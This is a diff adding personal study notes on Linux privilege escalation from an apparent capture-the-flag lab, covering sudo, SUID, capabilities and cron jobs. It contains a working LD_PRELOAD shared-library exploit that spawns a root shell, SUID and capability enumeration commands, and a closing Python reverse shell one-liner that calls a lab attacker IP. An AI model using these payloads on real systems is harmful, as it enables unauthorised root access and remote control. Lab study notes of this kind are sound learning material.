@@ -61,7 +61,99 @@ we used CVE-2015-1328 for this task.
 ---------------------------------
 Sudo Permission Misconfigurations
 ---------------------------------
+Some times admins give users permission to run some applications or commands as root/sudo.
+
+We can seem any commands possible to be run with sudo by doing:
+
+sudo -l
+
+https://gtfobins.github.io/
+This site above has a good cheatsheet on commands that can be executed as root to escalate priviledges
+
+Another thing we can do in sudo -l is leveraging something named LD_PRELOAD
+
+LD_PRELOAD is an enviroment variable that allows any program to be run with any library. which means we can make our own malicious library and execute it as sudo!
+
+if both env_keep and Ld_PRELOAD are enabled, we can use this to run arbritary code as root
+
+Some example C code to make our own libary:
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+
+then compiling it with these parameters:
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+
+sudo LD_PRELOAD=shell.so *COMMAND_ABLE_TO_RUN_AS_ROOT
 
 
+---------------------------------
+	SUID Binary Exploit
+---------------------------------
 
+Similar to the sudo exploit, we can exploit SUID binarys.
+
+SUID binarys that have had their permissions configured incorrectly and allows any user
+to run an application as the user who set the SUID binary. Typicall this is a root user.
+Therefore if a program can be excuted as root we can sometimes expolit it to create a root 
+shell.
+
+We can find SUID files by running:
+
+find / -type f -perm -04000 -ls 2>/dev/null
+
+we can run this and see if any applications stick out, and reference these with GTFO bins.
+
+if there are some, in the room we are given 'base64' which can read any file, we can possibly
+escalte privileges.
+
+
+---------------------------------
+	Capabilities
+---------------------------------
+
+Another way system admins can increase privileges of a binary is through Capabilities.
+Capabilities help manage privileges at a more 'granular' level. It is very similar to the SUID but specifies what a binary can SPECIFICLY do. So for example, ping typicall has the capability 
+cap_new_raw=ep
+
+'cap_net_raw' is the capability, 'ep' means the capabilities which are Effectively used and 
+capabilities which are Permitted (assigned to the capability)
+
+This is extremely confusing however, this guide is a good introduction to capabilities:
+
+https://linuxconfig.org/introduction-to-linux-capabilities
+
+We can view Capabilities by running 
+
+getcap -r / 2>/dev/null
+
+we redirect errors to /dev/null because getcap -r causes lots of errors.
+
+Again we can check GTFO bins for capabilities to use!
+
+
+---------------------------------
+	Cron Jobs
+---------------------------------
+
+Cronjobs are useed to run scripts or binaries at specific times within a machine.
+By default they run as the files owner, so if a script was being executed that was owned by root it would execute as root.
+
+They can be a privlege escalation vector under some conditions, for example if the file was modifiable by our current user, so we inject our own malicious code into it.
+
+Another example could be a binary has been deleted but the crontab running it hasnt been removed!
+
+We can view cronjobs running by viewing the crontab file
+
+cat /etc/crontab
+
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.93.140",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])
 
